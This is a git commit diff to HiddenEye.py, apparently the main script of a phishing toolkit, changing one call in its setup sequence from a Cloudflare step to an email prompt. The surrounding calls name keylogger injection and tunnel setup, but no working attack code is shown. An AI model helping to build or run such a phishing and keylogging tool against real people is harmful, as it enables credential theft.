6fe523ce75d56f73f9144eb5bd866b643ab9bb7f
AnonUD4Y <AnonUD4Y@gmail.com>
2019-11-07 13:32:34 +0000

    Add files via upload

--- HiddenEye.py
+++ HiddenEye.py
@@ -35,7 +35,7 @@ if __name__ == "__main__":
         keyloggerprompt()
         addingkeylogger()
         cloudfarePrompt()
-        addingCloudfare()
+        emailPrompt()
         inputCustom()
         port = selectPort()
 
